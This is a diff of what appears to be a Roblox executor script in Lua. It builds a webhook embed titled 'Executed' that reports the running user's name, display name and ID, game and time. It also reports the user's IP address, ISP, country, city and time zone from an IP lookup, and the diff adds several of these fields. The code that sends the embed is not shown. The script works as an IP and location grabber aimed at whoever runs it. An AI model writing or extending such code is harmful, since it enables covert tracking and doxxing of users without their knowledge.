@@ -25,20 +25,26 @@ if game:IsLoaded() then
 
     local current_time = os.date("%Y-%m-%d %H:%M:%S")
 
-
+    
     local embed = {
         {
-            ["title"] = "Информация о пользователе",
-            ["description"] = "Данные о пользователе:",
-            ["color"] = 0xFF0000, 
+            ["title"] = "Executed",
+            ["description"] = "User data",
+            ["color"] = 0xFF0000,
             ["fields"] = {
                 {
-                    ["name"] = "Имя пользователя",
+                    ["name"] = "Name",
                     ["value"] = player_name,
                     ["inline"] = true
                 },
+                
                 {
-                    ["name"] = "ID пользователя",
+                    ["name"] = "Display name",
+                    ["value"] = lp.DisplayName,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "ID",
                     ["value"] = tostring(player_id),
                     ["inline"] = true
                 },
@@ -48,12 +54,12 @@ if game:IsLoaded() then
                     ["inline"] = false
                 },
                 {
-                    ["name"] = "Игра",
+                    ["name"] = "Game",
                     ["value"] = place_name,
                     ["inline"] = false
                 },
                 {
-                    ["name"] = "Время",
+                    ["name"] = "Time",
                     ["value"] = current_time,
                     ["inline"] = false
                 },
@@ -62,14 +68,25 @@ if game:IsLoaded() then
                     ["value"] = getgenv().ipinfo_table.query,
                     ["inline"] = false
                 },
+                -- НОВЫЕ ПОЛЯ:
                 {
-                    ["name"] = "Страна",
+                    ["name"] = "Provider",
+                    ["value"] = getgenv().ipinfo_table.isp,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Country",
                     ["value"] = getgenv().ipinfo_table.country,
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "Город",
+                    ["name"] = "City",
                     ["value"] = getgenv().ipinfo_table.city,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Time zone",
+                    ["value"] = getgenv().ipinfo_table.timezone,
                     ["inline"] = true
                 }
             }
